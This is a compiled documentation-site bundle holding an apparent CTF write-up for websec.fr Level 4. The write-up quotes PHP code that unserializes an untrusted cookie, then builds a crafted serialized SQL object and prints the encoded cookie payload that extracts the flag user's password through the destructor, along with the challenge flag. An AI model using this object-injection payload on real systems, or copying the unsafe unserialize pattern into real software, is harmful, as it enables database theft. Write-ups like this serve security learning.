"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[5736],{3905:function(e,n,t){t.d(n,{Zo:function(){return c},kt:function(){return h}});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),p=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},c=function(e){var n=p(e.components);return r.createElement(l.Provider,{value:n},e.children)},u={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,i=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),d=p(t),h=a,m=d["".concat(l,".").concat(h)]||d[h]||u[h]||i;return t?r.createElement(m,o(o({ref:n},c),{},{components:t})):r.createElement(m,o({ref:n},c))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var i=t.length,o=new Array(i);o[0]=d;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s.mdxType="string"==typeof e?e:a,o[1]=s;for(var p=2;p<i;p++)o[p]=t[p];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},9292:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},toc:function(){return c},default:function(){return d}});var r=t(7462),a=t(3366),i=(t(7294),t(3905)),o=["components"],s={},l="Level 4",p={unversionedId:"websec.fr/level04",id:"websec.fr/level04",isDocsHomePage:!1,title:"Level 4",description:"Description",source:"@site/docs/websec.fr/level04.md",sourceDirName:"websec.fr",slug:"/websec.fr/level04",permalink:"/Writeups/docs/websec.fr/level04",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/websec.fr/level04.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Level 3",permalink:"/Writeups/docs/websec.fr/level03"},next:{title:"Level 17",permalink:"/Writeups/docs/websec.fr/level17"}},c=[{value:"Description",id:"description",children:[]},{value:"Solution",id:"solution",children:[{value:"Initial observation",id:"initial-observation",children:[]},{value:"Exploitation",id:"exploitation",children:[]}]}],u={toc:c};function d(e){var n=e.components,t=(0,a.Z)(e,o);return(0,i.kt)("wrapper",(0,r.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"level-4"},"Level 4"),(0,i.kt)("h2",{id:"description"},"Description"),(0,i.kt)("p",null,"Challenge URL: ",(0,i.kt)("a",{parentName:"p",href:"https://websec.fr/level04/index.php"},"https://websec.fr/level04/index.php"),"  "),(0,i.kt)("p",null,"Since we're lazy, we take advantage of php's garbage collector to properly display query results.\nWe also do like to write neat OOP. You can get the sources ",(0,i.kt)("a",{parentName:"p",href:"https://websec.fr/level04/source1.php"},"here")," and ",(0,i.kt)("a",{parentName:"p",href:"https://websec.fr/level04/source2.php"},"here"),". "),(0,i.kt)("h2",{id:"solution"},"Solution"),(0,i.kt)("h3",{id:"initial-observation"},"Initial observation"),(0,i.kt)("p",null,"The first source:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},"<?php\ninclude 'connect.php';\n\n$sql = new SQL();\n$sql->connect();\n$sql->query = 'SELECT username FROM users WHERE id=';\n\n\nif (isset ($_COOKIE['leet_hax0r'])) {\n    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));\n    try {\n        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {\n            die('CANT HACK US!!!');\n        }\n    } catch(Exception $e) {\n        echo $e;\n    }\n} else {\n    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;\n    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));\n}\n\nif (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {\n    try {\n        $sql->query .= $_REQUEST['id'];\n    } catch(Exception $e) {\n        echo ' Invalid query';\n    }\n}\n?>\n")),(0,i.kt)("p",null,"The second source:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n\nclass SQL {\n    public $query = '';\n    public $conn;\n    public function __construct() {\n    }\n    \n    public function connect() {\n        $this->conn = new SQLite3 (\"database.db\", SQLITE3_OPEN_READONLY);\n    }\n\n    public function SQL_query($query) {\n        $this->query = $query;\n    }\n\n    public function execute() {\n        return $this->conn->query ($this->query);\n    }\n\n    public function __destruct() {\n        if (!isset ($this->conn)) {\n            $this->connect ();\n        }\n        \n        $ret = $this->execute ();\n        if (false !== $ret) {    \n            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {\n                echo '<p class=\"well\"><strong>Username:<strong> ' . $row['username'] . '</p>';\n            }\n        }\n    }\n}\n?>\n")),(0,i.kt)("p",null,"From these sources, we can see that the ",(0,i.kt)("inlineCode",{parentName:"p"},"leet_hax0r")," cookie is an associative array with ",(0,i.kt)("inlineCode",{parentName:"p"},"ip")," as a property. This array is then serialized and encoded in base64 before being transmitted to the client."),(0,i.kt)("p",null,"When the server receives a request, it decodes the ",(0,i.kt)("inlineCode",{parentName:"p"},"leet_hax0r")," cookie value, unserializes it and stored in ",(0,i.kt)("inlineCode",{parentName:"p"},"$sess_data"),". Then, it checks whether ",(0,i.kt)("inlineCode",{parentName:"p"},"$sess_data")," is an array and its ",(0,i.kt)("inlineCode",{parentName:"p"},"ip"),"'s value is of the IP address of the server. If either is wrong, ",(0,i.kt)("strong",{parentName:"p"},"CANT HACK US!!!")," is returned. Also, if the ",(0,i.kt)("inlineCode",{parentName:"p"},"id")," parameter is set and is of integer, it will perform a SQL query."),(0,i.kt)("p",null,"In the second source code, the interesting here is the ",(0,i.kt)("inlineCode",{parentName:"p"},"__destruct()")," method because it will be called when a ",(0,i.kt)("inlineCode",{parentName:"p"},"SQL")," object is deleted. In addition, the ",(0,i.kt)("inlineCode",{parentName:"p"},"username")," column from the result of the SQL query will be echoed."),(0,i.kt)("h3",{id:"exploitation"},"Exploitation"),(0,i.kt)("p",null,"From the above information, we can guess that this application is vulnerable to ",(0,i.kt)("strong",{parentName:"p"},"object injection"),".",(0,i.kt)("br",{parentName:"p"}),"\n","In order to execute an arbitrary SQL query, we need to craft ourselves an ",(0,i.kt)("inlineCode",{parentName:"p"},"SQL")," object whose properties are similar to those of the ",(0,i.kt)("inlineCode",{parentName:"p"},"$sql")," on the server."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},"class SQL {\n    public $query = '';\n    public $conn;\n}\n\n$inj = new SQL();\n")),(0,i.kt)("p",null,"As SQL is not an array, we completely bypass the first ",(0,i.kt)("inlineCode",{parentName:"p"},"if..else..")," block:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},"if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {\n    die('CANT HACK US!!!');\n}\n")),(0,i.kt)("p",null,"When giving ",(0,i.kt)("inlineCode",{parentName:"p"},"1")," as the ",(0,i.kt)("strong",{parentName:"p"},"User id"),", we get ",(0,i.kt)("strong",{parentName:"p"},"Username: flag"),"; therefore, we might want the ",(0,i.kt)("inlineCode",{parentName:"p"},"password")," of this user.",(0,i.kt)("br",{parentName:"p"}),"\n","Our query would be"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT password FROM users WHERE username='flag';\n")),(0,i.kt)("p",null,"However, only the column named ",(0,i.kt)("inlineCode",{parentName:"p"},"usernamed")," is echoed back, we need an alias:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT password as username FROM users WHERE username='flag';\n")),(0,i.kt)("p",null,"Now, our ",(0,i.kt)("inlineCode",{parentName:"p"},"$inj")," object would be:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$inj->query = \"SELECT password as username FROM users WHERE username='flag';\";\n")),(0,i.kt)("p",null,"Let's serialize and encode this object:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"php > $sql->query = \"SELECT password as username FROM users WHERE username='flag';\";\nphp > echo urlencode(base64_encode(serialize($sql)));\nTzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NjE6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIHVzZXJuYW1lPSdmbGFnJzsiO3M6NDoiY29ubiI7Tjt9\n")),(0,i.kt)("p",null,"Modify the ",(0,i.kt)("inlineCode",{parentName:"p"},"leet_hax0r")," cookie value to our value.  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/132871370-ff4b11c1-f9d4-41fe-9a12-62b43a5c71d4.png",alt:"image"})),(0,i.kt)("p",null,"And got the result:  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/132871429-b6e5279b-2545-4c27-97cc-0e4287c82801.png",alt:"image"})),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}"))))}d.isMDXComponent=!0}}]);